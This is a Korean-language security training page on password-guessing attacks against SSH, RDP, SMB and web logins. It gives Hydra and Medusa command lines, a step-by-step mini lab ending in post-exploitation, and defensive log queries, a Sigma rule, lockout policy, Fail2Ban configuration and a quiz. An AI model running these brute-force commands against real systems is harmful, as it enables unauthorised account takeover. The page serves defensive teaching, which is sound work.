#1. Hydra 도구 분석

🐲

THC-Hydra: 최강의 온라인 비밀번호 공격 도구

THC-Hydra는 가장 널리 사용되는 온라인 비밀번호 크래킹 도구입니다. 50개 이상의 프로토콜을 지원하며, 병렬 연결을 통해 빠른 속도로 비밀번호를 시도합니다. 핵심 특징: 멀티스레드 지원, 모듈식 프로토콜 엔진, 세션 복원 기능.

hydra_examples.sh
bash
⚠️ 교육 목적 코드 — 허가된 환경에서만 실행
# THC-Hydra 비밀번호 추측 공격 예시
# 전제조건: 합법적인 침투 테스트 환경
# SSH 비밀번호 추측 (단일 사용자)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
ssh://192.168.1.100 -t 4 -V
# RDP 비밀번호 추측 (사용자 목록)
hydra -L users.txt -P passwords.txt \
rdp://10.0.0.5 -t 1 -w 5
# HTTP POST 폼 로그인 공격
hydra -l admin -P wordlist.txt \
http-post-form://target.com \
"/login:user=^USER^&pass=^PASS^:Invalid"
# 주요 옵션: -l 단일사용자 -L 사용자목록 -P 비밀번호목록 -t 스레드수

#2. Medusa와 Ncrack 비교 분석

🛠️

대안 도구: Medusa & Ncrack

Hydra 외에도 다양한 비밀번호 추측 도구가 있습니다. Medusa는 안정성과 속도에 중점을 둔 병렬 로그인 크래커이며, Ncrack은 Nmap 프로젝트에서 개발한 고속 네트워크 인증 크래킹 도구입니다.

medusa_examples.sh
bash
⚠️ 교육 목적 코드 — 허가된 환경에서만 실행
# Medusa SSH 비밀번호 추측
medusa -h 192.168.1.100 -u admin \
-P /usr/share/wordlists/rockyou.txt \
-M ssh -t 4 -O result.txt
# Medusa SMB 비밀번호 추측
medusa -h 10.0.0.5 -U users.txt \
-P passwords.txt -M smbnt

#3. SSH 프로토콜 공격 분석

🔌

SSH 비밀번호 추측의 특징

SSH(Secure Shell)는 원격 서버 관리에 가장 많이 사용되는 프로토콜입니다. 기본 포트 22번에서 동작하며, 인터넷에 노출된 SSH 서버는 매일 수천~수만 건의 비밀번호 추측 시도를 받습니다.

ssh_log_analysis.sh
bash
🔎 로그 분석 명령어 — 방어 목적
# SSH 로그인 실패 로그 확인
grep 'Failed password' /var/log/auth.log
# 실패 로그 예시:
# Mar 03 14:23:01 server sshd[1234]: Failed password \
# for root from 203.0.113.50 port 44521 ssh2
# IP별 실패 횟수 집계
grep 'Failed password' /var/log/auth.log | \
awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head

#4. Windows 로그 기반 탐지 (Event ID 4625)

📡

Windows Security Event 4625 분석

Windows는 모든 로그인 실패를 Security 이벤트 로그에 Event ID 4625로 기록합니다. 이 이벤트에는 대상 계정, 원본 IP, 로그온 유형(Network=3, RemoteInteractive=10), 실패 사유 코드 등이 포함됩니다.

event4625_analysis.ps1
powershell
🔎 방어 목적 탐지 스크립트
# 최근 1시간 내 로그인 실패 이벤트 조회
$start = (Get-Date).AddHours(-1)
Get-WinEvent -FilterHashtable @{
LogName = 'Security'
Id = 4625
StartTime = $start
} | Select-Object TimeCreated,
@{N='Account';E={$_.Properties[5].Value}},
@{N='SourceIP';E={$_.Properties[19].Value}},
@{N='LogonType';E={$_.Properties[10].Value}}
# IP별 실패 횟수 집계 (임계값 초과 시 경고)
$threshold = 10
$events | Group-Object SourceIP |
Where-Object { $_.Count -gt $threshold } |
ForEach-Object { Write-Warning "[ALERT] $($_.Name): $($_.Count) failures" }

#5. Sigma 탐지 규칙 작성

📋

Sigma 규칙으로 비밀번호 추측 탐지

Sigma는 SIEM 벤더에 독립적인 탐지 규칙 형식입니다. YAML로 작성되며, Splunk, Elasticsearch, Microsoft Sentinel 등 다양한 SIEM으로 변환할 수 있습니다.

brute_force_detection.yml
yaml
title: Brute Force Password Guessing Detection
id: a8f5e2b1-3c4d-4e6f-b7a8-9d0e1f2c3d4e
status: production
level: high
logsource:
product: windows
service: security
detection:
selection:
EventID: 4625
LogonType:
- 3 # Network (SMB)
- 10 # RemoteInteractive (RDP)
condition: selection | count(SourceIP) by TargetUserName > 10
timeframe: 10m

#6. RDP/SMB 프로토콜 공격 분석

🖥️

RDP 비밀번호 추측의 위험성

RDP(Remote Desktop Protocol)는 Windows 원격 데스크톱 서비스로, 포트 3389에서 동작합니다. 코로나19 이후 원격근무 확대로 인터넷에 노출된 RDP 서비스가 급증하면서, RDP 비밀번호 추측 공격은 랜섬웨어 배포의 주요 초기 침투 경로가 되었습니다.

#7. 계정 잠금 정책 설계

🔒

효과적인 계정 잠금 정책

계정 잠금 정책은 비밀번호 추측 공격의 1차 방어선입니다. 최적의 정책 설계: 실패 임계값(5~10회), 잠금 시간(15~30분), 관찰 기간(30분), 점진적 지연(Progressive Delay) 방식이 권장됩니다.

account_lockout_gpo.ps1
powershell
🛠️ AD 정책 설정 — 테스트 후 적용
# Active Directory 계정 잠금 정책 설정
Set-ADDefaultDomainPasswordPolicy -Identity 'corp.local' `
-LockoutThreshold 5 ` # 5회 실패 시 잠금
-LockoutDuration '00:30:00' ` # 30분간 잠금
-LockoutObservationWindow '00:30:00' # 30분 관찰
# 비밀번호 복잡도 정책
Set-ADDefaultDomainPasswordPolicy -Identity 'corp.local' `
-MinPasswordLength 12 `
-ComplexityEnabled $true `
-PasswordHistoryCount 24

#8. Fail2Ban과 자동 차단

🚫

Fail2Ban: 자동 IP 차단 시스템

Fail2Ban은 Linux 시스템에서 로그 파일을 모니터링하여 비밀번호 추측 공격을 자동으로 탐지하고, 공격 IP를 iptables/nftables 방화벽으로 자동 차단하는 오픈소스 도구입니다.

fail2ban_jail.conf
ini
# /etc/fail2ban/jail.local
[DEFAULT]
bantime = 3600 # 1시간 차단
findtime = 600 # 10분 관찰 기간
maxretry = 5 # 5회 실패 시 차단
# SSH 보호
[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log
maxretry = 3 # SSH는 3회로 강화

Fail2Ban 동작 흐름

  [공격자 IP]              [Linux 서버]
       |                       |
       |-- SSH 로그인 시도 --> |  /var/log/auth.log
       |-- 실패 1회 -------->  |    'Failed password'
       |-- 실패 2회 -------->  |    'Failed password'
       |-- 실패 3회 -------->  |    'Failed password'
       |                       |
       |                  [Fail2Ban 감지]
       |                       |
       |                  iptables -I INPUT
       |                  -s 공격자IP -j DROP
       |                       |
       |-- 시도 4회 ---X       |  CONNECTION REFUSED
       +-- 1시간 후 해제       |

#10. Mini Lab — SSH 비밀번호 추측 공격 시뮬레이션

공격자의 SSH 비밀번호 추측 과정을 단계별로 따라가 보세요.

1️⃣대상 호스트 SSH 포트 스캔
nmap -sV -p 22 target 명령으로 SSH 서비스가 열려있는지 확인합니다. OpenSSH 버전 정보도 파악합니다.
2️⃣사용자명 열거
일부 SSH 서버에서는 유효한 사용자명과 무효한 사용자명의 응답 시간이 다릅니다. 이를 이용하여 존재하는 계정명을 파악합니다.
3️⃣비밀번호 사전(Wordlist) 선택
rockyou.txt 또는 대상 기업에 맞는 커스텀 워드리스트를 준비합니다. 한국 기업 대상의 경우 한글 이름+숫자 패턴을 추가합니다.
4️⃣Hydra로 공격 실행
hydra -l root -P rockyou.txt ssh://target -t 4 명령으로 4개 스레드로 병렬 대입을 시작합니다.
5️⃣자격증명 발견 및 접속
유효한 비밀번호가 발견되면 '[22][ssh] host: target login: root password: P@ssw0rd123' 형태로 출력됩니다.
6️⃣접근 후 활동 (Post-Exploitation)
획득한 자격증명으로 SSH 접속 후, 권한 상승, 내부 네트워크 탐색, 데이터 탈취 등을 수행합니다.

#Q. 종합 퀴즈

Q1. Hydra에서 '-t 4' 옵션의 의미는?

💡 Hydra의 -t 옵션은 동시에 실행할 병렬 연결(스레드) 수를 지정합니다. -t 4는 4개의 연결을 동시에 유지하면서 비밀번호를 시도합니다.

Q2. Windows Event ID 4625에서 LogonType=10은 어떤 인증 방식?

💡 LogonType 10은 RemoteInteractive, 즉 RDP를 통한 로그인 시도입니다. LogonType 3은 네트워크(SMB), 2는 로컬 콘솔입니다.

Q3. Linux에서 SSH 비밀번호 추측 공격을 기록하는 로그 파일은?

💡 /var/log/auth.log (Debian/Ubuntu) 또는 /var/log/secure (RHEL/CentOS)에 SSH 인증 실패 로그가 기록됩니다.

Q4. Fail2Ban의 maxretry=3, findtime=600, bantime=3600 설정의 의미는?

💡 findtime=600(10분 관찰), maxretry=3(최대 3회), bantime=3600(1시간 차단). 10분 내 3회 실패 시 1시간 차단.

Q5. Sigma 규칙에서 비밀번호 추측 탐지에 사용할 Windows Event ID는?

💡 Event ID 4625는 Windows 로그인 실패 이벤트입니다. 다수 발생 시 비밀번호 추측 공격을 의심할 수 있습니다.

Q6. RDP 비밀번호 추측이 랜섬웨어 배포의 주요 침투 경로인 이유는?

💡 RDP 접속 성공 시 원격 데스크톱 환경에서 직접 작업할 수 있어 랜섬웨어 설치가 용이합니다.

Q7. Hydra HTTP POST 공격에서 '^USER^'와 '^PASS^'의 역할은?

💡 ^USER^와 ^PASS^는 Hydra의 플레이스홀더로, 사용자명과 비밀번호가 자동 삽입됩니다.

Q8. 속도 제한(Rate Limiting)의 방어 원리는?

💡 속도 제한은 특정 IP/계정에 대해 단위 시간당 로그인 시도를 제한하여 자동화 공격을 비효율적으로 만듭니다.
